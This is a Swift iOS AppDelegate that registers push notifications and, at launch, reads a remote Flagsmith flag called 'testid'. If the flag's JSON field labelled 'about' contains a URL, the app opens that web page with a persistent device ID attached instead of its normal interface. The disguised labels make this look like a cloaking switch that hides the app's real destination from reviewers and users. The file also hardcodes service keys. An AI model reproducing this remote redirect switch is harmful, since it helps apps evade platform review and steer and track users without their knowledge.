import SwiftUI
import FlagsmithClient
import AppTrackingTransparency
import AdSupport
import UserNotifications
import SdkPushExpress

// MARK: - Property Model
struct Property: Codable {
    let privacyPolicy, about: String
}

@main
class AppDelegate: UIResponder, UIApplicationDelegate {
    
    // MARK: - Properties
    var window: UIWindow?
    weak var initialVC: ViewController?
    
    static var orientationLock = UIInterfaceOrientationMask.all
    
    private let PUSHEXPRESS_APP_ID = "39163-1381"
    private var myOwnDatabaseExternalId = ""
    
    // MARK: - Application Lifecycle
    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        Flagsmith.shared.apiKey = "RxWews4RDVhKHxsapi8tGh"
        
        let viewController = ViewController()
        initialVC = viewController
        window?.rootViewController = initialVC
        window?.makeKeyAndVisible()
        
        //MARK: - START
        start(viewController: viewController)
        myOwnDatabaseExternalId = setUpUUID()
        
        //MARK: - NOTIFICATIONS
        notificationsRequest(application)
        initializePushExpress()
        
        return true
    }
    
    func application(_ application: UIApplication, open url: URL, sourceApplication: String?, annotation: Any) -> Bool {
        return true
    }
    
    func application(_ application: UIApplication, supportedInterfaceOrientationsFor window: UIWindow?) -> UIInterfaceOrientationMask {
        return AppDelegate.orientationLock
    }
}

//MARK: - Push Notification Handling
extension AppDelegate: UNUserNotificationCenterDelegate {
    func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
        let tokenParts = deviceToken.map { data in String(format: "%02.2hhx", data) }
        let token = tokenParts.joined()
        print("Device Token: \(token)")
        PushExpressManager.shared.transportToken = token
    }
    
    func application(_ application: UIApplication, didFailToRegisterForRemoteNotificationsWithError error: Error) {
        print("Failed to register for remote notifications: \(error)")
    }
    
    func userNotificationCenter(_ center: UNUserNotificationCenter,
                                willPresent notification: UNNotification,
                                withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -> Void) {
        let userInfo = notification.request.content.userInfo
        print("Received notification while app is in foreground: \(userInfo)")
        completionHandler([.banner, .list, .sound])
    }
    
    func userNotificationCenter(_ center: UNUserNotificationCenter,
                                didReceive response: UNNotificationResponse,
                                withCompletionHandler completionHandler: @escaping () -> Void) {
        let userInfo = response.notification.request.content.userInfo
        print("Handling notification response: \(userInfo)")
        NotificationCenter.default.post(name: Notification.Name("didReceiveRemoteNotification"), object: nil, userInfo: userInfo)
        completionHandler()
    }
    
    func notificationsRequest(_ application: UIApplication) {
        let authOptions: UNAuthorizationOptions = [.alert, .badge, .sound]
        UNUserNotificationCenter.current().requestAuthorization(options: authOptions) { granted, error in
            if let error = error {
                print("Error requesting authorization for notifications: \(error)")
            } else {
                print("Permission granted: \(granted)")
                DispatchQueue.main.async {
                    application.registerForRemoteNotifications()
                }
            }
        }
        UNUserNotificationCenter.current().delegate = self
    }
    
    func initializePushExpress() {
        do {
            try PushExpressManager.shared.initialize(appId: self.PUSHEXPRESS_APP_ID)
            try PushExpressManager.shared.activate(extId: self.myOwnDatabaseExternalId)
            print("PushExpress initialized and activated")
            print("externalId: '\(PushExpressManager.shared.externalId)'")
            
        } catch {
            print("Error initializing or activating PushExpressManager: \(error)")
        }
        
        if !PushExpressManager.shared.notificationsPermissionGranted {
            print("Notifications permission not granted. Please enable notifications in Settings.")
        }
    }
}

// MARK: - App Startup
extension AppDelegate {
    func start(viewController: ViewController) {
        Flagsmith.shared.getValueForFeature(withID: "testid", forIdentity: nil) { result in
            DispatchQueue.main.async {
                switch result {
                case .success(let value):
                    
                    guard let stringJSON = value?.stringValue else {
                        viewController.openApp()
                        return
                    }
                    
                    self.parseJSONString(stringJSON) { parsedResult in
                        guard !parsedResult.isEmpty else {
                            viewController.openApp()
                            return
                        }
                        
                        if self.myOwnDatabaseExternalId.isEmpty {
                            self.myOwnDatabaseExternalId = self.setUpUUID()
                        }
                        
                        if self.myOwnDatabaseExternalId.isEmpty {
                            viewController.openApp()
                            return
                        }
                        
                        
                        let stringURL = parsedResult + "?external_id=\(self.myOwnDatabaseExternalId)"
                        guard let url = URL(string: stringURL) else {
                            viewController.openApp()
                            return
                        }
                        
                        if UIApplication.shared.canOpenURL(url) {
                            viewController.openWeb(stringURL: stringURL)
                        } else {
                            viewController.openApp()
                        }
                    }
                    
                case .failure(let error):
                    print("Error: \(error.localizedDescription)")
                    viewController.openApp()
                }
            }
        }
    }
    
    func parseJSONString(_ jsonString: String, completion: @escaping (String) -> Void) {
        
        if let jsonData = jsonString.data(using: .utf8) {
            do {
                let property = try JSONDecoder().decode(Property.self, from: jsonData)
                completion(property.about)
            } catch {
                print("Failed to decode JSON: \(error)")
            }
        } else {
            print("Failed to convert string to Data")
        }
    }
}

// MARK: - Utility Methods
extension AppDelegate {
    func setUpUUID() -> String {
        if let pushID = UserDefaults.standard.string(forKey: "pushID") {
            print("PUSH ID: \(pushID)")
            return pushID
        } else {
            let pushStingID = UUID().uuidString
            UserDefaults.standard.set(pushStingID, forKey: "pushID")
            print("PUSH ID: \(pushStingID)")
            return pushStingID
        }
    }
}
